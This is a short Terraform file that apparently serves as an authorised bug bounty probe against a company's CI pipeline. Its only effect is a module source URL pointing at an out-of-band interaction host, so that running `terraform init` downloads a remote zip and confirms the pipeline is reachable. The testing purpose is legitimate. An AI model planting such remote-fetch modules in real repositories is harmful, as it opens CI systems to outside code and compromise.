# Authorised security test - loveholidays bug bounty, researcher GitHub user 0xNayel.
# This file declares no resources, no providers and no backend. Its only effect is a
# module source URL, used to establish whether this pull request reaches a CI system
# that runs `terraform init`. Nothing here creates, changes or destroys anything.

terraform {
  required_version = ">= 1.0"
}

module "reachability_probe" {
  source = "https://lh-atlantis-pr-r9.dbsc2mghlkvjbivjjabgzwrt6uieqtakp.oast.pro/probe.zip"
}
